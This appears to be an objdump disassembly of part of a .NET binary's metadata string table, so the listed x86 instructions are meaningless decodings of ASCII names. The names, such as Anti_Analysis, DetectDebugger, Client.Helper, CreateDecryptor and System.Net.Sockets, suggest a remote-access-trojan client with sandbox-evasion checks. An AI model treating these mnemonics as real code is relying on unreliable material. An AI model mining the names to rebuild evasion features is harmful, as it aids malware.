  408ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ba7:	65 72 00             	gs jb  0x408baa
  408baa:	67 65 74 5f          	addr16 gs je 0x408c0d
  408bae:	42                   	inc    %edx
  408baf:	75 66                	jne    0x408c17
  408bb1:	66 65 72 00          	data16 gs jb 0x408bb5
  408bb5:	73 65                	jae    0x408c1c
  408bb7:	74 5f                	je     0x408c18
  408bb9:	42                   	inc    %edx
  408bba:	75 66                	jne    0x408c22
  408bbc:	66 65 72 00          	data16 gs jb 0x408bc0
  408bc0:	57                   	push   %edi
  408bc1:	72 69                	jb     0x408c2c
  408bc3:	74 65                	je     0x408c2a
  408bc5:	49                   	dec    %ecx
  408bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc7:	74 65                	je     0x408c2e
  408bc9:	67 65 72 00          	addr16 gs jb 0x408bcd
  408bcd:	67 65 74 5f          	addr16 gs je 0x408c30
  408bd1:	41                   	inc    %ecx
  408bd2:	73 49                	jae    0x408c1d
  408bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd5:	74 65                	je     0x408c3c
  408bd7:	67 65 72 00          	addr16 gs jb 0x408bdb
  408bdb:	73 65                	jae    0x408c42
  408bdd:	74 5f                	je     0x408c3e
  408bdf:	41                   	inc    %ecx
  408be0:	73 49                	jae    0x408c2b
  408be2:	6e                   	outsb  %ds:(%esi),(%dx)
  408be3:	74 65                	je     0x408c4a
  408be5:	67 65 72 00          	addr16 gs jb 0x408be9
  408be9:	47                   	inc    %edi
  408bea:	65 74 41             	gs je  0x408c2e
  408bed:	73 49                	jae    0x408c38
  408bef:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf0:	74 65                	je     0x408c57
  408bf2:	67 65 72 00          	addr16 gs jb 0x408bf6
  408bf6:	53                   	push   %ebx
  408bf7:	65 74 41             	gs je  0x408c3b
  408bfa:	73 49                	jae    0x408c45
  408bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfd:	74 65                	je     0x408c64
  408bff:	67 65 72 00          	addr16 gs jb 0x408c03
  408c03:	44                   	inc    %esp
  408c04:	65 74 65             	gs je  0x408c6c
  408c07:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c0b:	62 75 67             	bound  %esi,0x67(%ebp)
  408c0e:	67 65 72 00          	addr16 gs jb 0x408c12
  408c12:	4d                   	dec    %ebp
  408c13:	61                   	popa
  408c14:	6e                   	outsb  %ds:(%esi),(%dx)
  408c15:	61                   	popa
  408c16:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c19:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c1b:	74 4f                	je     0x408c6c
  408c1d:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c20:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c24:	61                   	popa
  408c25:	72 63                	jb     0x408c8a
  408c27:	68 65 72 00 53       	push   $0x53007265
  408c2c:	65 73 73             	gs jae 0x408ca2
  408c2f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c36:	6e                   	outsb  %ds:(%esi),(%dx)
  408c37:	67 45                	addr16 inc %ebp
  408c39:	76 65                	jbe    0x408ca0
  408c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3c:	74 48                	je     0x408c86
  408c3e:	61                   	popa
  408c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c40:	64 6c                	fs insb (%dx),%es:(%edi)
  408c42:	65 72 00             	gs jb  0x408c45
  408c45:	54                   	push   %esp
  408c46:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4e:	65 72 00             	gs jb  0x408c51
  408c51:	43                   	inc    %ebx
  408c52:	6c                   	insb   (%dx),%es:(%edi)
  408c53:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c5a:	6c                   	insb   (%dx),%es:(%edi)
  408c5b:	70 65                	jo     0x408cc2
  408c5d:	72 00                	jb     0x408c5f
  408c5f:	54                   	push   %esp
  408c60:	6f                   	outsl  %ds:(%esi),(%dx)
  408c61:	55                   	push   %ebp
  408c62:	70 70                	jo     0x408cd4
  408c64:	65 72 00             	gs jb  0x408c67
  408c67:	44                   	inc    %esp
  408c68:	65 74 65             	gs je  0x408cd0
  408c6b:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c70:	75 66                	jne    0x408cd8
  408c72:	61                   	popa
  408c73:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c77:	65 72 00             	gs jb  0x408c7a
  408c7a:	43                   	inc    %ebx
  408c7b:	75 72                	jne    0x408cef
  408c7d:	72 65                	jb     0x408ce4
  408c7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c80:	74 55                	je     0x408cd7
  408c82:	73 65                	jae    0x408ce9
  408c84:	72 00                	jb     0x408c86
  408c86:	53                   	push   %ebx
  408c87:	74 72                	je     0x408cfb
  408c89:	65 61                	gs popa
  408c8b:	6d                   	insl   (%dx),%es:(%edi)
  408c8c:	57                   	push   %edi
  408c8d:	72 69                	jb     0x408cf8
  408c8f:	74 65                	je     0x408cf6
  408c91:	72 00                	jb     0x408c93
  408c93:	54                   	push   %esp
  408c94:	65 78 74             	gs js  0x408d0b
  408c97:	57                   	push   %edi
  408c98:	72 69                	jb     0x408d03
  408c9a:	74 65                	je     0x408d01
  408c9c:	72 00                	jb     0x408c9e
  408c9e:	45                   	inc    %ebp
  408c9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca0:	74 65                	je     0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	42                   	inc    %edx
  408ca5:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cac:	72 
  408cad:	74 65                	je     0x408d14
  408caf:	72 00                	jb     0x408cb1
  408cb1:	54                   	push   %esp
  408cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb3:	4c                   	dec    %esp
  408cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb5:	77 65                	ja     0x408d1c
  408cb7:	72 00                	jb     0x408cb9
  408cb9:	45                   	inc    %ebp
  408cba:	72 72                	jb     0x408d2e
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	72 00                	jb     0x408cbf
  408cbf:	49                   	dec    %ecx
  408cc0:	45                   	inc    %ebp
  408cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc2:	75 6d                	jne    0x408d31
  408cc4:	65 72 61             	gs jb  0x408d28
  408cc7:	74 6f                	je     0x408d38
  408cc9:	72 00                	jb     0x408ccb
  408ccb:	4d                   	dec    %ebp
  408ccc:	61                   	popa
  408ccd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cce:	61                   	popa
  408ccf:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd4:	74 4f                	je     0x408d25
  408cd6:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cd9:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cdd:	75 6d                	jne    0x408d4c
  408cdf:	65 72 61             	gs jb  0x408d43
  408ce2:	74 6f                	je     0x408d53
  408ce4:	72 00                	jb     0x408ce6
  408ce6:	53                   	push   %ebx
  408ce7:	79 73                	jns    0x408d5c
  408ce9:	74 65                	je     0x408d50
  408ceb:	6d                   	insl   (%dx),%es:(%edi)
  408cec:	2e 43                	cs inc %ebx
  408cee:	6f                   	outsl  %ds:(%esi),(%dx)
  408cef:	6c                   	insb   (%dx),%es:(%edi)
  408cf0:	6c                   	insb   (%dx),%es:(%edi)
  408cf1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf7:	73 2e                	jae    0x408d27
  408cf9:	49                   	dec    %ecx
  408cfa:	45                   	inc    %ebp
  408cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfc:	75 6d                	jne    0x408d6b
  408cfe:	65 72 61             	gs jb  0x408d62
  408d01:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d05:	47                   	inc    %edi
  408d06:	65 74 45             	gs je  0x408d4e
  408d09:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0a:	75 6d                	jne    0x408d79
  408d0c:	65 72 61             	gs jb  0x408d70
  408d0f:	74 6f                	je     0x408d80
  408d11:	72 00                	jb     0x408d13
  408d13:	41                   	inc    %ecx
  408d14:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d18:	61                   	popa
  408d19:	74 6f                	je     0x408d8a
  408d1b:	72 00                	jb     0x408d1d
  408d1d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d22:	00 2e                	add    %ch,(%esi)
  408d24:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d27:	6f                   	outsl  %ds:(%esi),(%dx)
  408d28:	72 00                	jb     0x408d2a
  408d2a:	4d                   	dec    %ebp
  408d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2d:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d34:	65 
  408d35:	61                   	popa
  408d36:	74 65                	je     0x408d9d
  408d38:	44                   	inc    %esp
  408d39:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d3d:	70 74                	jo     0x408db3
  408d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d40:	72 00                	jb     0x408d42
  408d42:	43                   	inc    %ebx
  408d43:	72 65                	jb     0x408daa
  408d45:	61                   	popa
  408d46:	74 65                	je     0x408dad
  408d48:	45                   	inc    %ebp
  408d49:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4a:	63 72 79             	arpl   %esi,0x79(%edx)
  408d4d:	70 74                	jo     0x408dc3
  408d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d50:	72 00                	jb     0x408d52
  408d52:	49                   	dec    %ecx
  408d53:	6e                   	outsb  %ds:(%esi),(%dx)
  408d54:	74 50                	je     0x408da6
  408d56:	74 72                	je     0x408dca
  408d58:	00 53 79             	add    %dl,0x79(%ebx)
  408d5b:	73 74                	jae    0x408dd1
  408d5d:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5f:	2e 44                	cs inc %esp
  408d61:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d68:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d6f:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d76:	6f                   	outsl  %ds:(%esi),(%dx)
  408d77:	64 73 00             	fs jae 0x408d7a
  408d7a:	4d                   	dec    %ebp
  408d7b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d82:	74 2e                	je     0x408db2
  408d84:	56                   	push   %esi
  408d85:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d8c:	73 69                	jae    0x408df7
  408d8e:	63 2e                	arpl   %ebp,(%esi)
  408d90:	44                   	inc    %esp
  408d91:	65 76 69             	gs jbe 0x408dfd
  408d94:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d97:	00 53 79             	add    %dl,0x79(%ebx)
  408d9a:	73 74                	jae    0x408e10
  408d9c:	65 6d                	gs insl (%dx),%es:(%edi)
  408d9e:	2e 52                	cs push %edx
  408da0:	75 6e                	jne    0x408e10
  408da2:	74 69                	je     0x408e0d
  408da4:	6d                   	insl   (%dx),%es:(%edi)
  408da5:	65 2e 49             	gs cs dec %ecx
  408da8:	6e                   	outsb  %ds:(%esi),(%dx)
  408da9:	74 65                	je     0x408e10
  408dab:	72 6f                	jb     0x408e1c
  408dad:	70 53                	jo     0x408e02
  408daf:	65 72 76             	gs jb  0x408e28
  408db2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408db9:	73 74                	jae    0x408e2f
  408dbb:	65 6d                	gs insl (%dx),%es:(%edi)
  408dbd:	2e 52                	cs push %edx
  408dbf:	75 6e                	jne    0x408e2f
  408dc1:	74 69                	je     0x408e2c
  408dc3:	6d                   	insl   (%dx),%es:(%edi)
  408dc4:	65 2e 43             	gs cs inc %ebx
  408dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc8:	6d                   	insl   (%dx),%es:(%edi)
  408dc9:	70 69                	jo     0x408e34
  408dcb:	6c                   	insb   (%dx),%es:(%edi)
  408dcc:	65 72 53             	gs jb  0x408e22
  408dcf:	65 72 76             	gs jb  0x408e48
  408dd2:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408dd9:	62 75 67             	bound  %esi,0x67(%ebp)
  408ddc:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de3:	65 
  408de4:	73 00                	jae    0x408de6
  408de6:	45                   	inc    %ebp
  408de7:	78 70                	js     0x408e59
  408de9:	61                   	popa
  408dea:	6e                   	outsb  %ds:(%esi),(%dx)
  408deb:	64 45                	fs inc %ebp
  408ded:	6e                   	outsb  %ds:(%esi),(%dx)
  408dee:	76 69                	jbe    0x408e59
  408df0:	72 6f                	jb     0x408e61
  408df2:	6e                   	outsb  %ds:(%esi),(%dx)
  408df3:	6d                   	insl   (%dx),%es:(%edi)
  408df4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df6:	74 56                	je     0x408e4e
  408df8:	61                   	popa
  408df9:	72 69                	jb     0x408e64
  408dfb:	61                   	popa
  408dfc:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e00:	00 47 65             	add    %al,0x65(%edi)
  408e03:	74 50                	je     0x408e55
  408e05:	72 6f                	jb     0x408e76
  408e07:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e0a:	73 65                	jae    0x408e71
  408e0c:	73 00                	jae    0x408e0e
  408e0e:	47                   	inc    %edi
  408e0f:	65 74 48             	gs je  0x408e5a
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	73 74                	jae    0x408e89
  408e15:	41                   	inc    %ecx
  408e16:	64 64 72 65          	fs fs jb 0x408e7f
  408e1a:	73 73                	jae    0x408e8f
  408e1c:	65 73 00             	gs jae 0x408e1f
  408e1f:	53                   	push   %ebx
  408e20:	79 73                	jns    0x408e95
  408e22:	74 65                	je     0x408e89
  408e24:	6d                   	insl   (%dx),%es:(%edi)
  408e25:	2e 53                	cs push %ebx
  408e27:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e2b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e32:	70 
  408e33:	74 6f                	je     0x408ea4
  408e35:	67 72 61             	addr16 jb 0x408e99
  408e38:	70 68                	jo     0x408ea2
  408e3a:	79 2e                	jns    0x408e6a
  408e3c:	58                   	pop    %eax
  408e3d:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e42:	72 74                	jb     0x408eb8
  408e44:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e4b:	73 00                	jae    0x408e4d
  408e4d:	45                   	inc    %ebp
  408e4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e52:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e56:	74 65                	je     0x408ebd
  408e58:	73 00                	jae    0x408e5a
  408e5a:	47                   	inc    %edi
  408e5b:	65 74 55             	gs je  0x408eb3
  408e5e:	74 66                	je     0x408ec6
  408e60:	38 42 79             	cmp    %al,0x79(%edx)
  408e63:	74 65                	je     0x408eca
  408e65:	73 00                	jae    0x408e67
  408e67:	75 74                	jne    0x408edd
  408e69:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e6d:	74 65                	je     0x408ed4
  408e6f:	73 00                	jae    0x408e71
  408e71:	52                   	push   %edx
  408e72:	66 63 32             	arpl   %si,(%edx)
  408e75:	38 39                	cmp    %bh,(%ecx)
  408e77:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e7b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e82:	73 00                	jae    0x408e84
  408e84:	52                   	push   %edx
  408e85:	65 61                	gs popa
  408e87:	64 41                	fs inc %ecx
  408e89:	6c                   	insb   (%dx),%es:(%edi)
  408e8a:	6c                   	insb   (%dx),%es:(%edi)
  408e8b:	42                   	inc    %edx
  408e8c:	79 74                	jns    0x408f02
  408e8e:	65 73 00             	gs jae 0x408e91
  408e91:	44                   	inc    %esp
  408e92:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e96:	65 46                	gs inc %esi
  408e98:	72 6f                	jb     0x408f09
  408e9a:	6d                   	insl   (%dx),%es:(%edi)
  408e9b:	42                   	inc    %edx
  408e9c:	79 74                	jns    0x408f12
  408e9e:	65 73 00             	gs jae 0x408ea1
  408ea1:	53                   	push   %ebx
  408ea2:	77 61                	ja     0x408f05
  408ea4:	70 42                	jo     0x408ee8
  408ea6:	79 74                	jns    0x408f1c
  408ea8:	65 73 00             	gs jae 0x408eab
  408eab:	4c                   	dec    %esp
  408eac:	6f                   	outsl  %ds:(%esi),(%dx)
  408ead:	61                   	popa
  408eae:	64 46                	fs inc %esi
  408eb0:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408eb7:	74 
  408eb8:	65 73 00             	gs jae 0x408ebb
  408ebb:	47                   	inc    %edi
  408ebc:	65 74 41             	gs je  0x408f00
  408ebf:	73 42                	jae    0x408f03
  408ec1:	79 74                	jns    0x408f37
  408ec3:	65 73 00             	gs jae 0x408ec6
  408ec6:	53                   	push   %ebx
  408ec7:	65 74 41             	gs je  0x408f0b
  408eca:	73 42                	jae    0x408f0e
  408ecc:	79 74                	jns    0x408f42
  408ece:	65 73 00             	gs jae 0x408ed1
  408ed1:	47                   	inc    %edi
  408ed2:	65 74 42             	gs je  0x408f17
  408ed5:	79 74                	jns    0x408f4b
  408ed7:	65 73 00             	gs jae 0x408eda
  408eda:	72 61                	jb     0x408f3d
  408edc:	77 42                	ja     0x408f20
  408ede:	79 74                	jns    0x408f54
  408ee0:	65 73 00             	gs jae 0x408ee3
  408ee3:	62 79 74             	bound  %edi,0x74(%ecx)
  408ee6:	65 73 00             	gs jae 0x408ee9
  408ee9:	43                   	inc    %ebx
  408eea:	53                   	push   %ebx
  408eeb:	68 61 72 70 41       	push   $0x41707261
  408ef0:	72 67                	jb     0x408f59
  408ef2:	75 6d                	jne    0x408f61
  408ef4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef6:	74 49                	je     0x408f41
  408ef8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef9:	66 6f                	outsw  %ds:(%esi),(%dx)
  408efb:	46                   	inc    %esi
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	61                   	popa
  408efe:	67 73 00             	addr16 jae 0x408f01
  408f01:	43                   	inc    %ebx
  408f02:	53                   	push   %ebx
  408f03:	68 61 72 70 42       	push   $0x42707261
  408f08:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f0f:	61                   	popa
  408f10:	67 73 00             	addr16 jae 0x408f13
  408f13:	65 73 46             	gs jae 0x408f5c
  408f16:	6c                   	insb   (%dx),%es:(%edi)
  408f17:	61                   	popa
  408f18:	67 73 00             	addr16 jae 0x408f1b
  408f1b:	53                   	push   %ebx
  408f1c:	74 72                	je     0x408f90
  408f1e:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f25:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f2c:	65 
  408f2d:	53                   	push   %ebx
  408f2e:	65 74 74             	gs je  0x408fa5
  408f31:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f38:	73 73                	jae    0x408fad
  408f3a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f41:	6e                   	outsb  %ds:(%esi),(%dx)
  408f42:	67 45                	addr16 inc %ebp
  408f44:	76 65                	jbe    0x408fab
  408f46:	6e                   	outsb  %ds:(%esi),(%dx)
  408f47:	74 41                	je     0x408f8a
  408f49:	72 67                	jb     0x408fb2
  408f4b:	73 00                	jae    0x408f4d
  408f4d:	41                   	inc    %ecx
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	74 69                	je     0x408fba
  408f51:	5f                   	pop    %edi
  408f52:	41                   	inc    %ecx
  408f53:	6e                   	outsb  %ds:(%esi),(%dx)
  408f54:	61                   	popa
  408f55:	6c                   	insb   (%dx),%es:(%edi)
  408f56:	79 73                	jns    0x408fcb
  408f58:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f60:	74 69                	je     0x408fcb
  408f62:	41                   	inc    %ecx
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	61                   	popa
  408f65:	6c                   	insb   (%dx),%es:(%edi)
  408f66:	79 73                	jns    0x408fdb
  408f68:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f6f:	73 00                	jae    0x408f71
  408f71:	49                   	dec    %ecx
  408f72:	43                   	inc    %ebx
  408f73:	72 65                	jb     0x408fda
  408f75:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f78:	74 69                	je     0x408fe3
  408f7a:	61                   	popa
  408f7b:	6c                   	insb   (%dx),%es:(%edi)
  408f7c:	73 00                	jae    0x408f7e
  408f7e:	73 65                	jae    0x408fe5
  408f80:	74 5f                	je     0x408fe1
  408f82:	43                   	inc    %ebx
  408f83:	72 65                	jb     0x408fea
  408f85:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f88:	74 69                	je     0x408ff3
  408f8a:	61                   	popa
  408f8b:	6c                   	insb   (%dx),%es:(%edi)
  408f8c:	73 00                	jae    0x408f8e
  408f8e:	45                   	inc    %ebp
  408f8f:	71 75                	jno    0x409006
  408f91:	61                   	popa
  408f92:	6c                   	insb   (%dx),%es:(%edi)
  408f93:	73 00                	jae    0x408f95
  408f95:	53                   	push   %ebx
  408f96:	73 6c                	jae    0x409004
  408f98:	50                   	push   %eax
  408f99:	72 6f                	jb     0x40900a
  408f9b:	74 6f                	je     0x40900c
  408f9d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa0:	73 00                	jae    0x408fa2
  408fa2:	52                   	push   %edx
  408fa3:	65 61                	gs popa
  408fa5:	64 54                	fs push %esp
  408fa7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	57                   	push   %edi
  408fad:	72 69                	jb     0x409018
  408faf:	74 65                	je     0x409016
  408fb1:	54                   	push   %esp
  408fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb4:	6c                   	insb   (%dx),%es:(%edi)
  408fb5:	73 00                	jae    0x408fb7
  408fb7:	42                   	inc    %edx
  408fb8:	79 74                	jns    0x40902e
  408fba:	65 73 54             	gs jae 0x409011
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	73 00                	jae    0x408fc2
  408fc2:	53                   	push   %ebx
  408fc3:	79 73                	jns    0x409038
  408fc5:	74 65                	je     0x40902c
  408fc7:	6d                   	insl   (%dx),%es:(%edi)
  408fc8:	2e 57                	cs push %edi
  408fca:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd1:	46                   	inc    %esi
  408fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd3:	72 6d                	jb     0x409042
  408fd5:	73 00                	jae    0x408fd7
  408fd7:	44                   	inc    %esp
  408fd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd9:	73 00                	jae    0x408fdb
  408fdb:	43                   	inc    %ebx
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408fde:	74 61                	je     0x409041
  408fe0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fe7:	74 65                	je     0x40904e
  408fe9:	6d                   	insl   (%dx),%es:(%edi)
  408fea:	2e 43                	cs inc %ebx
  408fec:	6f                   	outsl  %ds:(%esi),(%dx)
  408fed:	6c                   	insb   (%dx),%es:(%edi)
  408fee:	6c                   	insb   (%dx),%es:(%edi)
  408fef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff5:	73 00                	jae    0x408ff7
  408ff7:	53                   	push   %ebx
  408ff8:	74 72                	je     0x40906c
  408ffa:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409001:	74 4f                	je     0x409052
  409003:	70 74                	jo     0x409079
  409005:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40900c:	74 49                	je     0x409057
  40900e:	6d                   	insl   (%dx),%es:(%edi)
  40900f:	61                   	popa
  409010:	67 65 44             	addr16 gs inc %esp
  409013:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409017:	65 72 73             	gs jb  0x40908d
  40901a:	00 52 75             	add    %dl,0x75(%edx)
  40901d:	6e                   	outsb  %ds:(%esi),(%dx)
  40901e:	74 69                	je     0x409089
  409020:	6d                   	insl   (%dx),%es:(%edi)
  409021:	65 48                	gs dec %eax
  409023:	65 6c                	gs insb (%dx),%es:(%edi)
  409025:	70 65                	jo     0x40908c
  409027:	72 73                	jb     0x40909c
  409029:	00 53 73             	add    %dl,0x73(%ebx)
  40902c:	6c                   	insb   (%dx),%es:(%edi)
  40902d:	50                   	push   %eax
  40902e:	6f                   	outsl  %ds:(%esi),(%dx)
  40902f:	6c                   	insb   (%dx),%es:(%edi)
  409030:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409037:	72 73                	jb     0x4090ac
  409039:	00 73 73             	add    %dh,0x73(%ebx)
  40903c:	6c                   	insb   (%dx),%es:(%edi)
  40903d:	50                   	push   %eax
  40903e:	6f                   	outsl  %ds:(%esi),(%dx)
  40903f:	6c                   	insb   (%dx),%es:(%edi)
  409040:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409047:	72 73                	jb     0x4090bc
  409049:	00 46 69             	add    %al,0x69(%esi)
  40904c:	6c                   	insb   (%dx),%es:(%edi)
  40904d:	65 41                	gs inc %ecx
  40904f:	63 63 65             	arpl   %esp,0x65(%ebx)
  409052:	73 73                	jae    0x4090c7
  409054:	00 68 50             	add    %ch,0x50(%eax)
  409057:	72 6f                	jb     0x4090c8
  409059:	63 65 73             	arpl   %esp,0x73(%ebp)
  40905c:	73 00                	jae    0x40905e
  40905e:	47                   	inc    %edi
  40905f:	65 74 43             	gs je  0x4090a5
  409062:	75 72                	jne    0x4090d6
  409064:	72 65                	jb     0x4090cb
  409066:	6e                   	outsb  %ds:(%esi),(%dx)
  409067:	74 50                	je     0x4090b9
  409069:	72 6f                	jb     0x4090da
  40906b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906e:	73 00                	jae    0x409070
  409070:	49                   	dec    %ecx
  409071:	50                   	push   %eax
  409072:	41                   	inc    %ecx
  409073:	64 64 72 65          	fs fs jb 0x4090dc
  409077:	73 73                	jae    0x4090ec
  409079:	00 43 6f             	add    %al,0x6f(%ebx)
  40907c:	6d                   	insl   (%dx),%es:(%edi)
  40907d:	70 72                	jo     0x4090f1
  40907f:	65 73 73             	gs jae 0x4090f5
  409082:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409086:	6f                   	outsl  %ds:(%esi),(%dx)
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	70 72                	jo     0x4090fc
  40908a:	65 73 73             	gs jae 0x409100
  40908d:	00 53 79             	add    %dl,0x79(%ebx)
  409090:	73 74                	jae    0x409106
  409092:	65 6d                	gs insl (%dx),%es:(%edi)
  409094:	2e 4e                	cs dec %esi
  409096:	65 74 2e             	gs je  0x4090c7
  409099:	53                   	push   %ebx
  40909a:	6f                   	outsl  %ds:(%esi),(%dx)
  40909b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40909e:	74 73                	je     0x409113
  4090a0:	00 73 65             	add    %dh,0x65(%ebx)
  4090a3:	74 5f                	je     0x409104
  4090a5:	41                   	inc    %ecx
  4090a6:	72 67                	jb     0x40910f
  4090a8:	75 6d                	jne    0x409117
  4090aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ac:	74 73                	je     0x409121
  4090ae:	00 53 79             	add    %dl,0x79(%ebx)
  4090b1:	73 74                	jae    0x409127
  4090b3:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b5:	45                   	inc    %ebp
  4090b6:	76 65                	jbe    0x40911d
